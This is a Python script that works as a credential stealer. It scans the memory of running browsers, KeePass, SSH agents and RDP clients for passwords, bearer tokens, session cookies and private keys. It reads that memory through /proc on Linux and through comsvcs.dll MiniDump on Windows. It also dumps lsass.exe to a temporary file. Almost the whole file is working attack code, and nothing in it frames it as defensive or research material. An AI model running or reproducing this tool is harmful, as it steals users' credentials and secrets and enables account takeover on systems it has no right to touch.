import os
import sys
import struct
import json
import re
import platform
import ctypes
import subprocess
import tempfile
import hashlib

def extract_process_memory():
    """Extract credentials from live process memory.
    Targets: browser processes (Chrome, Firefox, Edge), lsass.exe,
    password managers (KeePass, 1Password), SSH agents, RDP clients.
    Linux: reads /proc/<pid>/maps + /proc/<pid>/mem.
    Windows: MiniDumpWriteDump via comsvcs.dll or direct ReadProcessMemory.
    macOS: vmmap + memory read via mach_vm_read.
    """
    sys_name = platform.system()
    results = {'system': sys_name, 'processes': [], 'credentials_found': []}

    # Target process patterns
    TARGETS = {
        'chrome': {'patterns': [r'chrome\.exe', r'chrome$', r'chromium'], 'search': [
            rb'password["\']\s*:\s*["\']([^"\']+)', rb'Authorization:\s*Bearer\s+(\S+)',
            rb'access_token["\']\s*:\s*["\']([^"\']]+)', rb'session_id["\']\s*:\s*["\']([^"\']]+)',
            rb'cookie:\s*([^\r\n]+)', rb'Set-Cookie:\s*([^\r\n]+)',
        ]},
        'firefox': {'patterns': [r'firefox\.exe', r'firefox$', r'firefox-esr'], 'search': [
            rb'password["\']\s*:\s*["\']([^"\']]+)', rb'Authorization:\s*([^\r\n]+)',
            rb'PHPSESSID=([A-Za-z0-9]+)', rb'JSESSIONID=([A-Za-z0-9]+)',
        ]},
        'edge': {'patterns': [r'msedge\.exe', r'microsoft-edge'], 'search': [
            rb'password["\']\s*:\s*["\']([^"\']]+)', rb'Authorization:\s*Bearer\s+(\S+)',
        ]},
        'keepass': {'patterns': [r'KeePass\.exe', r'keepass', r'keepassxc'], 'search': [
            rb'Password["\']\s*:\s*["\']([^"\']]+)', rb'Title["\']\s*:\s*["\']([^"\']]+)',
            rb'UserName["\']\s*:\s*["\']([^"\']]+)',
        ]},
        'ssh_agent': {'patterns': [r'ssh-agent', r'pageant\.exe'], 'search': [
            rb'-----BEGIN\s+(\w+)\s+PRIVATE\s+KEY-----',
            rb'ssh-rsa\s+(\S{20,})', rb'ssh-ed25519\s+(\S{20,})',
        ]},
        'rdp': {'patterns': [r'mstsc\.exe', r'xfreerdp', r'rdesktop'], 'search': [
            rb'password["\']?\s*[=:]\s*["\']?([^"\']\s]+)',
            rb'NLA.*password', rb'CredSSP',
        ]},
    }

    def get_pids():
        """Get running processes."""
        procs = []
        if sys_name == 'Linux':
            for pid_dir in os.listdir('/proc'):
                if pid_dir.isdigit():
                    try:
                        cmdline = open(f'/proc/{pid_dir}/cmdline', 'rb').read().replace(b'\x00', b' ').decode('utf-8', errors='replace')
                        procs.append({'pid': int(pid_dir), 'cmdline': cmdline})
                    except (PermissionError, FileNotFoundError):
                        pass
        elif sys_name == 'Windows':
            try:
                proc = subprocess.run(['tasklist', '/fo', 'csv', '/nh'], capture_output=True, text=True, timeout=10)
                for line in proc.stdout.strip().split('\n'):
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        procs.append({'pid': int(parts[1]), 'cmdline': parts[0]})
            except Exception:
                pass
        elif sys_name == 'Darwin':
            try:
                proc = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
                for line in proc.stdout.strip().split('\n')[1:]:
                    parts = line.split(None, 10)
                    if len(parts) >= 11:
                        procs.append({'pid': int(parts[1]), 'cmdline': parts[10]})
            except Exception:
                pass
        return procs

    def read_process_memory_linux(pid, max_regions=50, max_bytes_per_region=4*1024*1024):
        """Read process memory via /proc/pid/mem."""
        chunks = []
        maps_path = f'/proc/{pid}/maps'
        mem_path = f'/proc/{pid}/mem'
        try:
            with open(maps_path, 'r') as maps_file:
                regions = maps_file.readlines()[:max_regions]
            with open(mem_path, 'rb') as mem_file:
                for line in regions:
                    parts = line.split()
                    if len(parts) < 2 or 'r' not in parts[1]:
                        continue
                    addr_range = parts[0].split('-')
                    start = int(addr_range[0], 16)
                    end = int(addr_range[1], 16)
                    size = min(end - start, max_bytes_per_region)
                    try:
                        mem_file.seek(start)
                        data = mem_file.read(size)
                        if data:
                            chunks.append(data)
                    except (OSError, ValueError):
                        continue
        except PermissionError:
            return None
        return b''.join(chunks) if chunks else None

    def read_process_memory_windows(pid):
        """Dump process via comsvcs.dll MiniDump."""
        dump_path = os.path.join(tempfile.gettempdir(), f'forge_proc_{pid}.dmp')
        try:
            cmd = f'rundll32.exe comsvcs.dll, MiniDump {pid} {dump_path} full'
            subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            if os.path.exists(dump_path):
                with open(dump_path, 'rb') as f:
                    data = f.read(50*1024*1024)  # Max 50MB
                os.unlink(dump_path)
                return data
        except Exception:
            pass
        return None

    def search_memory(data, patterns):
        """Search memory dump for credential patterns."""
        found = []
        for pat in patterns:
            for match in re.finditer(pat, data):
                value = match.group(1) if match.lastindex else match.group(0)
                value_str = value.decode('utf-8', errors='replace')[:200]
                if len(value_str) > 3:  # Skip tiny matches
                    found.append({
                        'pattern': pat.decode('utf-8', errors='replace')[:60],
                        'value': value_str,
                        'offset': match.start(),
                    })
                    if len(found) >= 50:
                        return found
        return found

    all_procs = get_pids()
    for target_name, target_info in TARGETS.items():
        for proc in all_procs:
            for pat in target_info['patterns']:
                if re.search(pat, proc['cmdline'], re.IGNORECASE):
                    pid = proc['pid']
                    results['processes'].append({'name': target_name, 'pid': pid, 'cmdline': proc['cmdline'][:100]})
                    memory_data = None
                    if sys_name == 'Linux':
                        memory_data = read_process_memory_linux(pid)
                    elif sys_name == 'Windows':
                        memory_data = read_process_memory_windows(pid)
                    if memory_data:
                        creds = search_memory(memory_data, target_info['search'])
                        if creds:
                            for c in creds:
                                c['source_process'] = target_name
                                c['source_pid'] = pid
                            results['credentials_found'].extend(creds)
                    break

    # Also check for lsass on Windows
    if sys_name == 'Windows':
        for proc in all_procs:
            if 'lsass' in proc['cmdline'].lower():
                dump_path = os.path.join(tempfile.gettempdir(), 'forge_lsass.dmp')
                try:
                    cmd = f'rundll32.exe comsvcs.dll, MiniDump {proc["pid"]} {dump_path} full'
                    subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
                    if os.path.exists(dump_path):
                        results['lsass_dump'] = {'path': dump_path, 'size': os.path.getsize(dump_path)}
                except Exception as e:
                    results['lsass_error'] = str(e)[:100]
                break

    results['summary'] = {
        'target_processes_found': len(results['processes']),
        'credentials_extracted': len(results['credentials_found']),
    }
    return results

if __name__ == '__main__':
    out = extract_process_memory()
    print(json.dumps(out, indent=2, default=str))

